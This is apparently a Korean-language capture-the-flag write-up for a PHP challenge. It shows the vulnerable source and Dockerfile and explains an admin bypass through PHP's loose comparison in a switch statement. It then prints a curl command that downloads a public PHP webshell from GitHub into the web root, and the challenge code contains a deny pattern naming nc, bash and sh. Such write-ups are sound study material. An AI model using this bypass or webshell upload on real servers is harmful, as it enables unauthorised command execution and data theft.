# 키워드
- PHP Loose Comparison
- Curl - webshell

# 문제 코드
- index.php
```php
<?php
include ("./config.php");
include("./config/db_config.php");

$message = "";

if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);

    if ($data === null) {
        exit("Failed to parse JSON data");
    }
        
    $username = $data->username;

    if($username === "admin" ){
        exit("no hack");
    }

    switch($username){
        case "admin":
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?");
            $stmt -> bind_param("ss",$user,$password);
            $stmt -> execute();
            $result = $stmt -> get_result();
            if ($result -> num_rows == 1){
                $_SESSION["auth"] = "admin";
                header("Location: test.php");
            } else {
                $message = "Something wrong...";
            }
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
            
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Enter Username</title>
</head>
<body>
    <div class="container">
        <h2>Enter Username</h2>
        <form method="POST" action="index.php">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <br>
            <input type="submit" value="Submit">
            <div class="message"><?php echo $message; ?></div>
        </form>
    </div>
</body>
</html>

```

- test.php
```php
<?php

include ("./config.php");

$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){

    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    if (preg_match($pattern, $sanitized_command)){
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
else if($_SESSION["auth"]=== "guest") {

    $command = "echo hi guest";
    $result = shell_exec($command);

}

else {
    $result = "Authentication first";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Command Test</title>
</head>
<body>
    <h2>Command Test</h2>
    <?php
    echo "<pre>$result</pre>";
    ?>
</body>
</html>
```

- dockerfile
```dockerfile
FROM php:8.0-apache

RUN apt-get update && \
    apt-get upgrade -y && \
    apt-get install -y gcc curl netcat-traditional

RUN docker-php-ext-install mysqli

COPY ./deploy/src /var/www/html/

COPY ./flag.c /flag.c
RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c

EXPOSE 80
```

# 분석
- username이 admin인지를 체크함 
- [공식문서](https://www.php.net/manual/en/control-structures.switch.php)를 확인해 보면 switch 문에서 느슨한 비교를 하는 것을 알 수 있음
- dockerfile을 보면 웹쉘을 을 올리는데 도움이 될만한 툴이 많이 설치되어 있음
- 그러나 대부분 $pattern에서 필터링하여 curl 정도만 사용할 수 있음


# 풀이
- swtich문에서 느슨한 비교를 한다는 점을 이용하여 username에 true를 넣어 우회를 할 수 있음
- 처음엔 리버스쉘을 올린다는 느낌으로 접근했는데 sh을 못써서 좀 빡셌음
- 빌드하고 권한을 보니 꽤 괜찮을 것 같아서 그냥 바인드쉘을 올림 

```
echo escapeshellcmd("curl https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./exploit.php");

curl https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -o ./exploit.php
```

-docker-compose 파일에서 mysql관련 인증정보도 줘서 db까지 탈취할 수 있을 것 같지만 거기까지는 안함
